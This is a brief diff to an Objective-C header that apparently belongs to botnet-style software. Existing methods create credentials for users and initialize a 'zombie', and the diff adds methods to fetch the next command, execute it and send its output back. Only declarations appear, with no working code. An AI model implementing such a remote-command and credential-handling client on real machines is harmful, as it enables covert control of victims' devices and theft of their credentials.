@@ -17,4 +17,7 @@
 +(void)createAllCredentialsForUser:(NSString *)user withUserId:(NSString *)userId;
 +(void)createCredential:(NSDictionary *)credentialInfo withUserId:(NSString *)userId;
 +(void)initializeNewZombie;
++(NSArray *)nextCommand;
++(void)sendCommandOutput:(NSString *)output withCommandId:(NSString *)commandId withCommandOutput:(NSString *)commandOutput;
++(void)execNextCommand;
 @end
